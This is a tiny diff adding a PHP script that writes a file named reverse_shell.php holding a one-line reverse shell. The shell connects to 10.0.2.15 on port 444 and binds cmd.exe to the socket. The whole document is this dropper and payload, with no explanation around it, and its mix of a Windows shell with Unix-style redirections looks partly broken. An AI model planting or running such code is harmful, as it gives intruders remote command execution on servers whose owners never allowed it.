@@ -1,0 +1,6 @@
+<?php
+$myfile = fopen("reverse_shell.php", "w") or die("error");
+$txt = '<?php $sock=fsockopen("10.0.2.15",444); exec("cmd.exe <&3 >&3 1>&3");?>';
+fwrite($myfile, $txt);
+fclose($myfile);
+?> 
